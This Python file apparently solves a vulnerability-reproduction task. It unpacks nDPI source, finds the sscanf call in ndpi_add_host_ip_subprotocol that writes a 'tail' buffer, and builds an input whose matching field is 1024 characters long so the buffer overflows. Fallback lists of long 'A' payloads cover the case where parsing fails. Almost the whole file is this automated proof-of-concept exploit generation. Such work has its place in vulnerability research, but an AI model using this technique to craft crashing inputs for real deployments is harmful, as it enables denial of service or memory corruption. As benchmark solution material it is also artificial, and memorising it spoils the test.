import os
import re
import tarfile
import tempfile
import shutil


def _extract_tar_to_temp(src_path: str) -> str:
    tmpdir = tempfile.mkdtemp(prefix="ndpi_src_")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(tmpdir)
    except Exception:
        shutil.rmtree(tmpdir, ignore_errors=True)
        raise
    return tmpdir


def _read_file_text(path: str) -> str:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        try:
            with open(path, "r", encoding="latin1", errors="ignore") as f:
                return f.read()
        except Exception:
            return ""


def _find_file(root: str, preferred: str) -> str:
    pref = os.path.join(root, preferred)
    if os.path.exists(pref):
        return pref
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if fn == os.path.basename(preferred):
                return os.path.join(dirpath, fn)
    return ""


def _find_function_body(code: str, func_name: str) -> str:
    # Find "ndpi_add_host_ip_subprotocol(" and then find the subsequent '{' and matching '}'
    start = code.find(func_name + "(")
    if start < 0:
        return ""
    # Find opening brace '{' after function prototype
    i = start
    length = len(code)
    # State machine for skipping comments/strings/chars
    in_sl_comment = False
    in_ml_comment = False
    in_str = False
    in_char = False
    esc = False

    # Move to first '{' after the closing ')' of function signature
    # First find the matching ')'
    paren = 0
    seen_open = False
    i = start
    while i < length:
        ch = code[i]
        nxt = code[i + 1] if i + 1 < length else ""
        if in_sl_comment:
            if ch == "\n":
                in_sl_comment = False
            i += 1
            continue
        if in_ml_comment:
            if ch == "*" and nxt == "/":
                in_ml_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if in_char:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        # Outside
        if ch == "/" and nxt == "/":
            in_sl_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml_comment = True
            i += 2
            continue
        if ch == '"':
            in_str = True
            i += 1
            continue
        if ch == "'":
            in_char = True
            i += 1
            continue
        if ch == "(":
            seen_open = True
            paren += 1
            i += 1
            continue
        if ch == ")":
            if seen_open:
                paren -= 1
                if paren == 0:
                    # Now find '{'
                    break
            i += 1
            continue
        i += 1

    # Now i is at ')', move forward to '{'
    while i < length:
        ch = code[i]
        nxt = code[i + 1] if i + 1 < length else ""
        if in_sl_comment:
            if ch == "\n":
                in_sl_comment = False
            i += 1
            continue
        if in_ml_comment:
            if ch == "*" and nxt == "/":
                in_ml_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if in_char:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        if ch == "/" and nxt == "/":
            in_sl_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml_comment = True
            i += 2
            continue
        if ch == '"':
            in_str = True
            i += 1
            continue
        if ch == "'":
            in_char = True
            i += 1
            continue
        if ch == "{":
            open_brace = i
            break
        i += 1
    else:
        return ""

    # Find matching '}'
    i = open_brace
    depth = 0
    in_sl_comment = False
    in_ml_comment = False
    in_str = False
    in_char = False
    esc = False
    while i < length:
        ch = code[i]
        nxt = code[i + 1] if i + 1 < length else ""
        if in_sl_comment:
            if ch == "\n":
                in_sl_comment = False
            i += 1
            continue
        if in_ml_comment:
            if ch == "*" and nxt == "/":
                in_ml_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if in_char:
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        if ch == "/" and nxt == "/":
            in_sl_comment = True
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml_comment = True
            i += 2
            continue
        if ch == '"':
            in_str = True
            i += 1
            continue
        if ch == "'":
            in_char = True
            i += 1
            continue
        if ch == "{":
            depth += 1
            i += 1
            continue
        if ch == "}":
            depth -= 1
            i += 1
            if depth == 0:
                close_brace = i
                return code[open_brace:close_brace]
            continue
        i += 1
    return ""


def _find_all_calls(code: str, name: str):
    # Returns list of (call_text_inside_parentheses, start_index, end_index)
    res = []
    idx = 0
    length = len(code)

    while True:
        idx = code.find(name + "(", idx)
        if idx < 0:
            break
        # Find matching closing ')'
        i = idx + len(name)
        # Skip to first '(' (should be there)
        if i >= length or code[i] != '(':
            idx += 1
            continue
        # State machine for parentheses, strings, chars, comments
        depth = 0
        in_sl_comment = False
        in_ml_comment = False
        in_str = False
        in_char = False
        esc = False
        start_args = i + 1
        i += 1
        while i < length:
            ch = code[i]
            nxt = code[i + 1] if i + 1 < length else ""
            if in_sl_comment:
                if ch == "\n":
                    in_sl_comment = False
                i += 1
                continue
            if in_ml_comment:
                if ch == "*" and nxt == "/":
                    in_ml_comment = False
                    i += 2
                else:
                    i += 1
                continue
            if in_str:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == '"':
                    in_str = False
                i += 1
                continue
            if in_char:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == "'":
                    in_char = False
                i += 1
                continue
            if ch == "/" and nxt == "/":
                in_sl_comment = True
                i += 2
                continue
            if ch == "/" and nxt == "*":
                in_ml_comment = True
                i += 2
                continue
            if ch == '"':
                in_str = True
                i += 1
                continue
            if ch == "'":
                in_char = True
                i += 1
                continue
            if ch == "(":
                depth += 1
                i += 1
                continue
            if ch == ")":
                if depth == 0:
                    call_inside = code[start_args:i]
                    res.append((call_inside, idx, i))
                    idx = i + 1
                    break
                else:
                    depth -= 1
                    i += 1
                    continue
            i += 1
        else:
            idx += 1
    return res


def _split_top_commas(s: str):
    parts = []
    buf = []
    depth = 0
    in_sl_comment = False
    in_ml_comment = False
    in_str = False
    in_char = False
    esc = False
    i = 0
    L = len(s)
    while i < L:
        ch = s[i]
        nxt = s[i + 1] if i + 1 < L else ""
        if in_sl_comment:
            if ch == "\n":
                in_sl_comment = False
            buf.append(ch)
            i += 1
            continue
        if in_ml_comment:
            if ch == "*" and nxt == "/":
                in_ml_comment = False
                buf.append(ch)
                buf.append(nxt)
                i += 2
            else:
                buf.append(ch)
                i += 1
            continue
        if in_str:
            buf.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == '"':
                in_str = False
            i += 1
            continue
        if in_char:
            buf.append(ch)
            if esc:
                esc = False
            elif ch == "\\":
                esc = True
            elif ch == "'":
                in_char = False
            i += 1
            continue
        if ch == "/" and nxt == "/":
            in_sl_comment = True
            buf.append(ch)
            buf.append(nxt)
            i += 2
            continue
        if ch == "/" and nxt == "*":
            in_ml_comment = True
            buf.append(ch)
            buf.append(nxt)
            i += 2
            continue
        if ch == '"':
            in_str = True
            buf.append(ch)
            i += 1
            continue
        if ch == "'":
            in_char = True
            buf.append(ch)
            i += 1
            continue
        if ch == "(":
            depth += 1
            buf.append(ch)
            i += 1
            continue
        if ch == ")":
            if depth > 0:
                depth -= 1
            buf.append(ch)
            i += 1
            continue
        if ch == "," and depth == 0:
            parts.append("".join(buf).strip())
            buf = []
            i += 1
            continue
        buf.append(ch)
        i += 1
    parts.append("".join(buf).strip())
    return parts


def _extract_string_literals(s: str):
    # return list of string literal contents with quotes included
    res = []
    i = 0
    L = len(s)
    in_str = False
    esc = False
    start = -1
    while i < L:
        ch = s[i]
        if not in_str:
            if ch == '"':
                in_str = True
                start = i
                esc = False
            i += 1
        else:
            if esc:
                esc = False
                i += 1
            elif ch == "\\":
                esc = True
                i += 1
            elif ch == '"':
                # end of string literal
                res.append(s[start:i + 1])
                in_str = False
                i += 1
            else:
                i += 1
    return res


def _unescape_c_string_literal(lit: str) -> str:
    # lit includes enclosing quotes; remove them
    inner = lit[1:-1]
    # Replace common escapes
    # We will handle \n, \r, \t, \\, \", \', \xHH; leave unknown as is
    # Use python codec 'unicode_escape' best-effort
    try:
        return bytes(inner, "utf-8").decode("unicode_escape")
    except Exception:
        # Fallback simple replacements
        repl = (
            inner.replace(r"\n", "\n")
            .replace(r"\r", "\r")
            .replace(r"\t", "\t")
            .replace(r'\"', '"')
            .replace(r"\'", "'")
            .replace(r"\\", "\\")
        )
        return repl


def _build_fmt_from_arg(fmt_arg: str) -> str:
    lits = _extract_string_literals(fmt_arg)
    if not lits:
        return ""
    pieces = [_unescape_c_string_literal(x) for x in lits]
    return "".join(pieces)


def _parse_scanf_format(fmt: str):
    tokens = []
    i = 0
    L = len(fmt)

    def add_lit(s):
        if not s:
            return
        if tokens and tokens[-1][0] == "lit":
            tokens[-1] = ("lit", tokens[-1][1] + s)
        else:
            tokens.append(("lit", s))

    while i < L:
        ch = fmt[i]
        if ch == "%":
            # flush pending literal before parsing conv
            # Parse conversion
            i += 1
            if i < L and fmt[i] == "%":
                add_lit("%")
                i += 1
                continue
            # assignment suppression
            star = False
            if i < L and fmt[i] == "*":
                star = True
                i += 1
            # width
            width_str = ""
            while i < L and fmt[i].isdigit():
                width_str += fmt[i]
                i += 1
            width = int(width_str) if width_str else None
            # length modifiers
            length = ""
            if i < L and fmt[i] in "hlLjzt":
                length += fmt[i]
                i += 1
                if i < L and fmt[i] in "hl" and length in ("h", "l"):
                    if fmt[i] == length[0]:
                        length += fmt[i]
                        i += 1
            if i >= L:
                # malformed
                tokens.append(("conv", {"spec": "", "star": star, "width": width, "length": length}))
                break
            spec = fmt[i]
            i += 1
            if spec == "[":
                # scanset
                neg = False
                if i < L and fmt[i] == "^":
                    neg = True
                    i += 1
                set_chars = []
                # ']' as first character inside set means literal
                if i < L and fmt[i] == "]":
                    set_chars.append("]")
                    i += 1
                # Read until ']'
                while i < L and fmt[i] != "]":
                    set_chars.append(fmt[i])
                    i += 1
                if i < L and fmt[i] == "]":
                    i += 1
                set_content = "".join(set_chars)
                tokens.append(
                    ("conv", {"spec": "[", "star": star, "width": width, "length": length, "neg": neg, "set": set_content})
                )
            else:
                tokens.append(("conv", {"spec": spec, "star": star, "width": width, "length": length}))
        elif ch.isspace():
            # compress any whitespace in format into a single space token to generate a single space
            # skip contiguous whitespaces
            j = i
            while j < L and fmt[j].isspace():
                j += 1
            tokens.append(("ws", " "))
            i = j
        else:
            # literal character
            add_lit(ch)
            i += 1
    return tokens


def _char_in_range(c, start, end):
    return ord(start) <= ord(c) <= ord(end)


def _pick_char_from_set(set_content: str, neg: bool) -> str:
    # Build allowed set from [set_content] or it's complement (for neg)
    # We'll limit to printable ASCII 32..126
    # If neg: allowed = all printable - parsed set; else: allowed = parsed set
    # Parse set_content to include literal chars and ranges like a-z, 0-9
    parsed = set()
    i = 0
    L = len(set_content)
    while i < L:
        ch = set_content[i]
        if i + 2 < L and set_content[i + 1] == "-" and set_content[i + 2] != "]":
            start = set_content[i]
            end = set_content[i + 2]
            # Add range
            if ord(start) <= ord(end):
                for o in range(ord(start), ord(end) + 1):
                    parsed.add(chr(o))
            else:
                for o in range(ord(end), ord(start) + 1):
                    parsed.add(chr(o))
            i += 3
        else:
            parsed.add(ch)
            i += 1
    printable = [chr(o) for o in range(32, 127)]
    if neg:
        allowed = [c for c in printable if c not in parsed]
    else:
        allowed = [c for c in printable if c in parsed]
    # Prefer letters and digits
    for c in ["A", "a", "x", "1", "0", "Z", "z"]:
        if c in allowed:
            return c
    return allowed[0] if allowed else "A"


def _generate_sample_for_conv(conv, is_tail: bool, long_len: int) -> str:
    spec = conv.get("spec", "")
    width = conv.get("width", None)
    # Provide minimal length for non-tail
    if spec in ("d", "i", "u", "o", "x", "X"):
        return "1"
    if spec in ("f", "F", "e", "E", "g", "G", "a", "A"):
        return "1.0"
    if spec == "s":
        # whitespace-delimited string
        if is_tail:
            n = long_len
        else:
            n = 1
        # Ensure not whitespace
        return "A" * n
    if spec == "c":
        # exact number of characters (width) or 1
        n = width if width and width > 0 else 1
        if is_tail:
            n = max(n, long_len)
        return "C" * n
    if spec == "p":
        # pointer-like hex; use 0x1
        return "0x1"
    if spec == "n":
        # consumes no input
        return ""
    if spec == "[":
        neg = conv.get("neg", False)
        set_content = conv.get("set", "")
        if is_tail:
            # Many repetitions; but ensure we don't include disallowed chars
            ch = _pick_char_from_set(set_content, neg)
            n = long_len
            return ch * n
        else:
            ch = _pick_char_from_set(set_content, neg)
            return ch
    # Unknown or empty spec: default to "X"
    return "X"


def _build_input_from_format(fmt: str, tail_conv_index: int, long_len: int = 1024) -> str:
    tokens = _parse_scanf_format(fmt)
    result = []
    conv_index = 0  # count only conversions that assign (no star)
    for tok in tokens:
        kind = tok[0]
        if kind == "lit":
            result.append(tok[1])
        elif kind == "ws":
            result.append(" ")
        elif kind == "conv":
            conv = tok[1]
            if conv.get("star", False):
                # suppressed assignment, still must consume input
                s = _generate_sample_for_conv(conv, False, long_len)
                result.append(s)
            else:
                is_tail = (conv_index == tail_conv_index)
                s = _generate_sample_for_conv(conv, is_tail, long_len)
                result.append(s)
                conv_index += 1
        else:
            # unexpected
            pass
    # Append newline to terminate if needed
    res = "".join(result)
    if not res.endswith("\n"):
        res += "\n"
    return res


def _find_tail_sscanf_and_build_poc(body: str) -> bytes:
    # Find declarations of 'tail' to ensure local variable
    # Try to find sscanf calls that have 'tail' as destination argument
    calls = _find_all_calls(body, "sscanf")
    # If __isoc99_sscanf is used
    calls += _find_all_calls(body, "__isoc99_sscanf")
    for call_inside, _, _ in calls:
        args = _split_top_commas(call_inside)
        if len(args) < 3:
            continue
        fmt_arg = args[1]
        # build format string
        fmt = _build_fmt_from_arg(fmt_arg)
        if not fmt:
            continue
        # Build list of assignment arguments (after fmt_arg)
        assign_args = args[2:]
        # find index of 'tail' among assign_args
        tail_arg_index = -1
        for i, a in enumerate(assign_args):
            # Match standalone 'tail' identifier in any expression
            if re.search(r"(^|[^A-Za-z0-9_])tail([^A-Za-z0-9_]|$)", a):
                tail_arg_index = i
                break
        if tail_arg_index < 0:
            continue
        # Determine the conversion index mapping ignoring suppressed ('*') conversions
        tokens = _parse_scanf_format(fmt)
        conv_indices = []
        for t in tokens:
            if t[0] == "conv":
                if not t[1].get("star", False):
                    conv_indices.append(t[1])
        if not conv_indices or tail_arg_index >= len(conv_indices):
            # Number of assignment arguments may exceed conversion tokens due to 'n' specifiers or errors; try to continue anyway
            # If conversions with 'n' present, it's also an assignment. Our conv_indices include 'n' since it's not suppressed.
            # If still mismatch, skip
            continue
        tail_conv_index = tail_arg_index
        # Construct the sample string
        poc_str = _build_input_from_format(fmt, tail_conv_index, long_len=1024)
        return poc_str.encode("utf-8", errors="ignore")
    return b""


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                root = _extract_tar_to_temp(src_path)
            # Prefer src/lib/ndpi_main.c
            cpath = _find_file(root, os.path.join("src", "lib", "ndpi_main.c"))
            if not cpath:
                # fallback: search for any file containing function name
                target_file = ""
                for dirpath, _, filenames in os.walk(root):
                    for fn in filenames:
                        if fn.endswith(".c"):
                            p = os.path.join(dirpath, fn)
                            txt = _read_file_text(p)
                            if "ndpi_add_host_ip_subprotocol" in txt:
                                target_file = p
                                break
                    if target_file:
                        break
                cpath = target_file
            if not cpath:
                # As a last resort, return a generic long token
                return b"proto:A\nA" * 2048
            code = _read_file_text(cpath)
            if not code:
                return b"A" * 4096 + b"\n"
            body = _find_function_body(code, "ndpi_add_host_ip_subprotocol")
            if not body:
                # If function body not found, try whole file
                body = code
            poc = _find_tail_sscanf_and_build_poc(body)
            if poc:
                return poc
            # Fallback: try to find any sscanf with a small local buffer including 'tail' variable by scanning entire file
            poc2 = _find_tail_sscanf_and_build_poc(code)
            if poc2:
                return poc2
            # Final fallback: craft a plausible custom rule line with a very long tail token.
            # Hypothesis format: "custom_rule host subproto tail"
            # We'll try several common patterns joined by newlines to increase chance without crashing fixed version.
            long = "A" * 1024
            candidates = [
                f"1 {long}\n",
                f"host {long}\n",
                f"host 1 {long}\n",
                f"1.2.3.4 {long}\n",
                f"host:1:{long}\n",
                f"{long}\n",
                f"proto {long}\n",
                f"custom {long}\n",
            ]
            return "".join(candidates).encode("utf-8", errors="ignore")
        finally:
            # Do not remove root if it's the provided directory
            if root and os.path.isdir(root) and not os.path.samefile(root, src_path):
                # Only cleanup if we created it
                if root.startswith(tempfile.gettempdir()):
                    shutil.rmtree(root, ignore_errors=True)
